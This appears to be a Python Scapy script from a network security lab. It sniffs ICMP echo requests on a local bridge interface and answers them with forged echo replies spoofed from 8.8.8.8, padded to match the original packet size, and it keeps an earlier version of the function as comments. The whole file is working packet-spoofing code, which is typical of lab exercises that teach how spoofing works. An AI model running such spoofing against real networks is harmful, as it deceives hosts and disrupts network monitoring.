from scapy.all import *
from scapy.layers.inet import ICMP, IP

# Define the IP address of attacker machine
attacker_ip = "10.9.0.1"

# Define the IP address of the target machine
target_ip = "10.9.0.5"

# Define the IP address of the fake machine
fake_ip = "8.8.8.8"


# Define the function to sniff and spoof packets
# def sniff_and_spoof(pkt):
#     # Check if the packet is an ICMP echo
#     if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
#         print("got request")
#         # Create a new packet with the spoofed source IP address
#         spoofed_pkt = IP(src=fake_ip, dst=target_ip, ttl=pkt[IP].ttl) / ICMP(type=0, id=pkt[ICMP].id,
#                                                                              seq=pkt[ICMP].seq) / "fake"
#         # Send the spoofed packet
#         send(spoofed_pkt)
#         print("sent spoof")
#         # Print a message to indicate that a packet has been spoofed
#         print("Spoofed packet sent: {} -> {}".format(spoofed_pkt[IP].src, spoofed_pkt[IP].dst))
def sniff_and_spoof(pkt):
    # Check if the packet is an ICMP echo
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
        print("got request")
        # Create a new packet with the spoofed source IP address
        spoofed_pkt = IP(src=fake_ip, dst=target_ip, ttl=pkt[IP].ttl, id=pkt[IP].id) / ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq) / "fake"
        # Add padding to the spoofed packet to make it the same size as the original packet
        padding_len = len(pkt) - len(spoofed_pkt)
        if padding_len > 0:
            spoofed_pkt = spoofed_pkt / Raw(load="X" * padding_len)
        # Send the spoofed packet
        send(spoofed_pkt)
        print("sent spoof")
        # Print a message to indicate that a packet has been spoofed
        print("Spoofed packet sent: {} -> {}".format(spoofed_pkt[IP].src, spoofed_pkt[IP].dst))
        print("..................................................")


if __name__ == "__main__":
    # Start sniffing packets on the LAN
    print("Start Snoofing...")
    packets = sniff(filter="icmp", prn=sniff_and_spoof, iface="br-5d71b3b00879")
    # wrpcap(packets, "snoofer_packets")
